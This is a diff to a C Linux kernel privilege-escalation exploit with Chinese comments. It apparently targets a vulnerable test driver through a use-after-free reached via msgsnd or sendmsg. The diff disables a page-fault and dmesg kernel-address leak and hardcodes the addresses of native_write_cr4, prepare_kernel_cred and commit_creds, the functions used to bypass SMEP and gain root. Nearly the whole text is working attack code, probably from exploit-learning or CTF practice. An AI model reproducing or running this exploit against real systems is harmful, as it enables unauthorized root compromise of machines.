@@ -108,10 +108,10 @@ int use_after_free_msgsnd(int fd, size_t target, size_t arg)
 // 触发page_fault 泄露kernel基址
 void do_page_fault()
 {
-	size_t info_leak_magic=0xffffffffffe39dd7; //0x41414141deadbeef    //只要是无法访问的地址就行，触发page_fault
+	size_t info_leak_magic=0x41414141deadbeef; //0x41414141deadbeef  0xffffffffffe39dd7  //只要是无法访问的地址就行，触发page_fault
 	int child_fd=open(PATH,O_RDWR);
-	//use_after_free_msgsnd(child_fd, info_leak_magic, 0); //触发执行info_leak_magic地址处的代码
-	use_after_free_sendmsg(child_fd, info_leak_magic, 0);
+	use_after_free_msgsnd(child_fd, info_leak_magic, 0); //触发执行info_leak_magic地址处的代码
+	//use_after_free_sendmsg(child_fd, info_leak_magic, 0);
 	return ;
 }
 
@@ -153,24 +153,24 @@ int main()
 	ioctl(fd,DRIVER_TEST,NULL);  //用于标识dmesg中字符串的开始
 
 	// step 2: 构造 page_fault 泄露kernel地址。从dmesg读取后写到/tmp/infoleak，再读出来
-	 pid_t pid=fork();
-	 if (pid==0){
-	 	do_page_fault();
-	 	exit(0);
-	 }
-	 int status;
-	 wait(&status);    // 等子进程结束
-	 sleep(10);
-	 printf("[+] Begin to leak address by dmesg![+]\n");
-	 size_t kernel_base = get_info_leak()-sys_ioctl_offset;
-	 printf("[+] Kernel base addr : %p [+] \n", kernel_base);
+	 //pid_t pid=fork();
+	// if (pid==0){
+	// 	do_page_fault();
+	// 	exit(0);
+	// }
+	// int status;
+	// wait(&status);    // 等子进程结束
+	 //sleep(10);
+	// printf("[+] Begin to leak address by dmesg![+]\n");
+	 //size_t kernel_base = get_info_leak()-sys_ioctl_offset;
+	// printf("[+] Kernel base addr : %p [+] \n", kernel_base);
 
-	 native_write_cr4_addr+=kernel_base;
-	 prepare_kernel_cred_addr+=kernel_base;
-	 commit_creds_addr+=kernel_base;
-	//native_write_cr4_addr=0xffffffff81064560;
-	//prepare_kernel_cred_addr=0xffffffff810a25b0;
-	//commit_creds_addr=0xffffffff810a21c0;
+	 //native_write_cr4_addr+=kernel_base;
+	 //prepare_kernel_cred_addr+=kernel_base;
+	 //commit_creds_addr+=kernel_base;
+	native_write_cr4_addr=0xffffffff81064560;
+	prepare_kernel_cred_addr=0xffffffff810a25b0;
+	commit_creds_addr=0xffffffff810a21c0;
 	printf("[+] We can get 3 important function address ![+]\n");
 	printf("        native_write_cr4_addr = %p\n",native_write_cr4_addr);
 	printf("        prepare_kernel_cred_addr = %p\n",prepare_kernel_cred_addr);
